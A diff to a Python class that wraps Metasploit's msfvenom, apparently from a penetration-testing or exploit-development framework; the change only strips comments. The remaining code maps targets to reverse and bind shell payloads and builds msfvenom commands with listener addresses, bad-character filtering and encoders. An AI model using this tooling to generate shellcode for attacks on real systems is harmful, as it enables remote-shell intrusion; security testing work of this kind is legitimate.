@@ -31,7 +31,6 @@ class MsfvenomConnector(ShellcodeConnector):
         ...     )
     """
 
-    # Payload mapping for common combinations
     PAYLOAD_MAP = {
         ("linux", "x86", "reverse"): "linux/x86/shell_reverse_tcp",
         ("linux", "x86", "bind"): "linux/x86/shell_bind_tcp",
@@ -151,30 +150,25 @@ class MsfvenomConnector(ShellcodeConnector):
         payload = self._get_payload_name(os_target, arch, shell_type)
         custom_params = custom_params or {}
 
-        # Build msfvenom command
         cmd = [self.msfvenom_path, "-p", payload]
 
-        # Add connection parameters for reverse/bind shells
+
         if shell_type.lower() in ["reverse", "bind"]:
             if shell_type.lower() == "reverse":
                 cmd.extend(["LHOST=" + ip, "LPORT=" + str(port)])
-            else:  # bind
+            else:
                 cmd.extend(["RHOST=" + ip, "LPORT=" + str(port)])
 
-        # Add custom parameters
         for key, value in custom_params.items():
             cmd.append(f"{key}={value}")
 
-        # Add bad character avoidance
         if bad_chars:
             bad_chars_str = "".join(bad_chars)
             cmd.extend(["-b", bad_chars_str])
 
-        # Add encoder
         if encoder:
             cmd.extend(["-e", encoder, "-i", str(iterations)])
 
-        # Set output format to raw
         cmd.extend(["-f", "raw"])
 
         logger.debug(f"Executing msfvenom: {' '.join(cmd)}")
@@ -252,7 +246,6 @@ class MsfvenomConnector(ShellcodeConnector):
             for line in output.split('\n'):
                 line = line.strip()
                 if '/' in line and not line.startswith('Name'):
-                    # Extract payload name (first column)
                     payload_name = line.split()[0]
                     if payload_name:
                         payloads.append(payload_name)
